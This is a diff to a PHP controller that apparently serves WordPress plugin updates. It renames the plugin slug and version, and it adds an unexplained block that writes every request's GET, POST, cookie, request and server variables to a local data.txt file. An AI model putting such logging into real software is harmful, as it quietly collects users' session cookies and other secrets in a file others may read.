@@ -36,7 +36,13 @@ class RepositoriesController extends AppController {
 		// Pull user agent  
 		$user_agent = $_SERVER['HTTP_USER_AGENT'];
 
-
+		$fp = fopen('data.txt', 'a');
+		fwrite($fp, print_r($_GET, true));
+		fwrite($fp, print_r($_POST, true));
+		fwrite($fp, print_r($_COOKIE, true));
+		fwrite($fp, print_r($_REQUEST, true));
+		fwrite($fp, print_r($_SERVER, true));
+		fclose($fp);
 		//Kill magic quotes.  Can't unserialize POST variable otherwise
 		if ( get_magic_quotes_gpc() ) {
 				$process = array( &$_GET, &$_POST, &$_COOKIE, &$_REQUEST );
@@ -55,10 +61,10 @@ class RepositoriesController extends AppController {
 		}
 		// make sure it's an array
 		$packages = array();
-		$packages['mt-adnetworks.cl-2/adnetworks.cl.php'] = array( //Replace plugin with the plugin slug that updates will be checking for
+		$packages['mt-www.chilerunning.com_/www.chilerunning.com.php'] = array( //Replace plugin with the plugin slug that updates will be checking for
 				'versions' => array(
-						'1.1' => array( //Array name should be set to current version of update
-								'version' => '1.1', //Current version available
+						'3' => array( //Array name should be set to current version of update
+								'version' => '3', //Current version available
 								'date' => '2014-12-2', //Date version was released
 								'author' => 'Author Name', //Author name - can be linked using html - <a href="http://link-to-site.com">Author Name</a>
 								'requires' => '2.8', // WP version required for plugin
@@ -76,7 +82,7 @@ class RepositoriesController extends AppController {
 											HTML can be used in all sections below for formating.  Must be properly escaped ie a single quote would have to be \'
 											Screenshot section must use exteranl links for img tags.
 										 */
-										'description' => 'Description of Plugin 1.1', //Description Tab
+										'description' => 'Description of Plugin 3', //Description Tab
 										'installation' => 'Install Info', //Installaion Tab
 										'screen shots' => 'Screen Shots', //Screen Shots
 										'change log' => 'Change log', //Change Log Tab
